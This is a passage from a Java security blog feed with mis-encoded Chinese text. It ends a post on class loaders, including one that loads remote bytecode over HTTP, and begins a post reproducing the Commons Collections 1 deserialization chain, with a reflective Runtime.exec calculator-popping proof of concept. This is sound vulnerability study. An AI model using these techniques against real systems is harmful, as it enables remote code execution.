class="line">System.out.println(<span class="string">"demo instance"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¯¥ç±»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . Demo.java</span><br></pre></td></tr></table></figure><p>æ¥ç€ä½¿ç”¨è‡ªå·±å†™çš„ç±»å»åŠ è½½<code>Demo</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        System.out.println(<span class="string">"çˆ¶ç±»åŠ è½½å™¨ï¼š"</span>+classLoader.getParent());</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">çˆ¶ç±»åŠ è½½å™¨ï¼šsun.misc.Launcher$AppClassLoader@<span class="number">7f</span>31245a</span><br><span class="line">demo instance</span><br></pre></td></tr></table></figure><h5 id="ä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸Šçš„ç±»"><a href="#ä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸Šçš„ç±»" class="headerlink" title="ä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸Šçš„ç±»"></a>ä½¿ç”¨URLClassLoaderåŠ è½½ç½‘ç»œä¸Šçš„ç±»</h5><p>Macä¸ŠApacheæœåŠ¡å™¨é»˜è®¤çš„webæ ¹ç›®å½•åœ¨ï¼š<code>/Library/WebServer/Documents</code>ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>Demo</code>ï¼›ç±»æ”¾åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡ŒåŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://localhost:80/"</span>);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h4><h5 id="è‡ªå®šä¹‰æ–‡ä»¶ç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰æ–‡ä»¶ç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰æ–‡ä»¶ç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰æ–‡ä»¶ç±»åŠ è½½å™¨</h5><ul><li>ç»§æ‰¿<code>ClassLoader</code>ç±»</li><li>è¦†ç›–<code>findClass</code>æ–¹æ³•</li></ul><p>å…·ä½“å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFileClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String directory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory,ClassLoader parent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//æŠŠç±»åè½¬æ¢ä¸ºç›®å½•</span></span><br><span class="line">            String file = directory + File.separator+name.replace(<span class="string">"."</span>,File.separator)+<span class="string">".class"</span>;</span><br><span class="line">            <span class="comment">//æ„å»ºè¾“å…¥æµ</span></span><br><span class="line">            InputStream in = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="comment">//æ„å»ºå­—èŠ‚è¾“å‡ºæµ</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = in.read(buf))!= -<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span> data[] = baos.toByteArray(); <span class="comment">//è¯»å–åˆ°çš„å­—èŠ‚ç çš„äºŒè¿›åˆ¶æ•°æ®</span></span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="è‡ªå®šä¹‰ç½‘ç»œç±»åŠ è½½å™¨"><a href="#è‡ªå®šä¹‰ç½‘ç»œç±»åŠ è½½å™¨" class="headerlink" title="è‡ªå®šä¹‰ç½‘ç»œç±»åŠ è½½å™¨"></a>è‡ªå®šä¹‰ç½‘ç»œç±»åŠ è½½å™¨</h5><p>å…·ä½“å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyURLClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyURLClassLoader</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = url+<span class="string">"/"</span>+name.replace(<span class="string">"."</span>,<span class="string">"/"</span>)+<span class="string">".class"</span>;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">            InputStream in = url.openStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len=in.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = baos.toByteArray();</span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyURLClassLoader classLoader = <span class="keyword">new</span> MyURLClassLoader(<span class="string">"http://localhost:80"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="çƒ­éƒ¨ç½²ç±»åŠ è½½å™¨"><a href="#çƒ­éƒ¨ç½²ç±»åŠ è½½å™¨" class="headerlink" title="çƒ­éƒ¨ç½²ç±»åŠ è½½å™¨"></a>çƒ­éƒ¨ç½²ç±»åŠ è½½å™¨</h5><p>å½“æˆ‘ä»¬è°ƒç”¨<code>loadClass</code>æ–¹æ³•åŠ è½½ç±»æ—¶ï¼Œä¼šé‡‡ç”¨åŒäº²å§”æ´¾æ¨¡å¼ï¼Œå³å¦‚æœç±»å·²ç»è¢«åŠ è½½ï¼Œå°±ä»ç¼“å­˜ä¸­è·å–ï¼Œä¸ä¼šé‡æ–°åŠ è½½ï¼Œå¦‚æœåŒä¸€ä¸ª<code>class</code>è¢«åŒä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½å¤šæ¬¡ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚å› æ­¤æˆ‘ä»¬è¦å®ç°çƒ­éƒ¨ç½²è®©åŒä¸€ä¸ª<code>class</code>æ–‡ä»¶è¢«ä¸åŒçš„ç±»åŠ è½½å™¨é‡å¤åŠ è½½å³å¯ï¼Œä½†æ˜¯ä¸èƒ½è°ƒç”¨<code>loadClass</code>æ–¹æ³•ï¼Œè€Œåº”è¯¥è°ƒç”¨<code>findClass</code>æ–¹æ³•ï¼Œé¿å¼€åŒäº²å§”æ´¾æ¨¡å¼ï¼Œä»è€Œå®ç°åŒä¸€ä¸ªç±»è¢«å¤šæ¬¡åŠ è½½ï¼Œå®ç°çƒ­éƒ¨ç½²ã€‚</p><p>å…·ä½“æµ‹è¯•</p><p>ä½¿ç”¨<code>loadClass</code>åŠ è½½ï¼Œè¾“å‡ºçš„<code>hashCode</code>æ˜¯ç›¸åŒçš„ï¼Œè¯´æ˜æ²¡æœ‰è¢«é‡å¤åŠ è½½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>findClass</code>åŠ è½½ï¼Œè¾“å‡ºçš„<code>hashCode</code>æ˜¯ä¸åŒçš„ï¼Œè¯´æ˜è¢«é‡å¤åŠ è½½ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader1 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        MyFileClassLoader classLoader2 = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>,classLoader1);</span><br><span class="line">        Class&lt;?&gt; clazz1 = classLoader1.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz2 = classLoader2.findClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        System.out.println(clazz1.hashCode());</span><br><span class="line">        System.out.println(clazz2.hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç±»çš„æ˜¾å¼ä¸éšå¼åŠ è½½"><a href="#ç±»çš„æ˜¾å¼ä¸éšå¼åŠ è½½" class="headerlink" title="ç±»çš„æ˜¾å¼ä¸éšå¼åŠ è½½"></a>ç±»çš„æ˜¾å¼ä¸éšå¼åŠ è½½</h4><p>ç±»çš„åŠ è½½æ–¹å¼æ˜¯æŒ‡è™šæ‹Ÿæœºå°†<code>class</code>æ–‡ä»¶åŠ è½½åˆ°å†…å­˜çš„æ–¹å¼ã€‚</p><p>æ˜¾å¼åŠ è½½æ˜¯æŒ‡åœ¨Javaä»£ç ä¸­é€šè¿‡è°ƒç”¨<code>ClassLoader</code>åŠ è½½<code>class</code>å¯¹è±¡ï¼Œæ¯”å¦‚<code>Class.forName(String name)</code>æˆ–è€…<code>this.getClass().getClassLoader().loadClass()</code>åŠ è½½ç±»</p><p>éšå¼åŠ è½½ä¸éœ€è¦åœ¨Javaä»£ç ä¸­æ˜ç¡®è°ƒç”¨åŠ è½½çš„ä»£ç ï¼Œè€Œæ˜¯é€šè¿‡è™šæ‹Ÿæœºè‡ªåŠ¨åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œæ¯”å¦‚åœ¨åŠ è½½æŸä¸ª<code>class</code>æ—¶ï¼Œè¯¥<code>class</code>å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡çš„å­—èŠ‚ç æ–‡ä»¶å°±ä¼šè¢«è™šæ‹Ÿæœºè‡ªåŠ¨åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç±»çš„åŠ è½½æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#ç±»çš„åŠ è½½æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;ç±»çš„åŠ è½½æ¦‚è¿°&quot;&gt;&lt;/a&gt;ç±»çš„åŠ è½½æ¦‚è¿°&lt;/h4&gt;&lt;p&gt;æˆ‘ä»¬ç¼–å†™çš„&lt;code&gt;.java&lt;/code&gt;æ‰©å±•åçš„æºä»£ç æ–‡ä»¶å­˜å‚¨ç€è¦æ‰§è¡Œçš„ç¨‹åºé€»è¾‘ï¼Œè¿™äº›æ–‡ä»¶éœ€è¦ç»è¿‡&lt;c
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java CC1é“¾å¤ç°ä¸åˆ†æ</title>
    <link href="elssm.github.io/2021/10/27/Java-CC1%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/</id>
    <published>2021-10-27T14:20:34.000Z</published>
    <updated>2021-10-30T08:44:26.535Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h4><p>Apache Commons Collectionsæ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶ä¸”å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸ºApacheå¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼ŒCommons Collectionsè¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨çš„å¼€å‘ã€‚å…¶å®Java JDKå·²ç»æä¾›äº†ä¸°å¯Œçš„é›†åˆæ“ä½œï¼Œä½†æ˜¯åœ¨æŸäº›åœºåˆä¸‹ï¼Œå¯èƒ½æ— æ³•æ»¡è¶³ï¼Œapache commonsç»„ä»¶æä¾›äº†æ›´åŠ ä¸°å¯Œçš„é›†æ•°æ®ç»“æ„ã€‚</p><h4 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections3.1</span><br></pre></td></tr></table></figure><p>JDK7ä¸‹è½½åœ°å€ï¼š<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/23.png" alt="23"></p><p>ä¸‹è½½å¥½ä¹‹åæŸ¥çœ‹æœ¬åœ°JDKç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % ls /Library/Java/JavaVirtualMachines </span><br><span class="line">jdk1.7.0_06.jdkjdk1.8.0_191.jdk</span><br></pre></td></tr></table></figure><h5 id="IDEAé…ç½®"><a href="#IDEAé…ç½®" class="headerlink" title="IDEAé…ç½®"></a>IDEAé…ç½®</h5><p>åˆ›å»ºå¥½Mavené¡¹ç›®ä¹‹åï¼ŒæŒ‡å®šå¯¹åº”çš„JDKç‰ˆæœ¬å³å¯</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/1.png" alt="1"></p><p>Common Collections3.1é€šè¿‡mavenæ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><h5 id="ä¸€ä¸ªç®€å•åå°„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•åå°„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•åå°„ä¾‹å­"></a>ä¸€ä¸ªç®€å•åå°„ä¾‹å­</h5><p>åœ¨åˆ†æè¯¥æ¼æ´ä¹‹å‰æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåˆ©ç”¨åå°„å¼¹è®¡ç®—å™¨çš„ä¾‹å­ã€‚åé¢çš„æ¼æ´åˆ†æä¼šåŸºäºè¿™ä¸ªä¾‹å­è¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ccTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        Class c = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Method m = c.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(r,<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ä»Trnsformerçœ‹èµ·"><a href="#ä»Trnsformerçœ‹èµ·" class="headerlink" title="ä»Trnsformerçœ‹èµ·"></a>ä»Trnsformerçœ‹èµ·</h5><p>æˆ‘ä»¬çŸ¥é“è¯¥æ¼æ´çš„é—®é¢˜å‡ºç°åœ¨Transformeræ¥å£ç±»ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹å®ç°è¿™ä¸ªç±»éƒ½æœ‰å“ªäº›æ–¹æ³•ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/2.png" alt="2"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éšä¾¿ç‚¹è¿›å»ä¸€ä¸ªæ–¹æ³•çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚ä¾‹å¦‚åœ¨<code>ConstantTransformer</code>ç±»è¿”å›çš„æ˜¯ä¸€ä¸ªå¸¸é‡ã€‚åœ¨<code>InvokerTransformer</code>ç±»ä¸­å®ç°çš„æ˜¯ä¸€ä¸ªåå°„è°ƒç”¨ï¼Œè€Œä¸”å‚æ•°éƒ½æ˜¯å¯æ§çš„ã€‚å› æ­¤æˆ‘ä»¬å°è¯•åˆ©ç”¨<code>InvokerTransformer</code>æ¥æ”¹å†™ä¸Šé¢çš„åå°„çš„ä¾‹å­ã€‚</p><p><img src="/2021/10/27/Java-CC1é“¾å¤ç°ä¸åˆ†æ/3.png" alt="3"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" 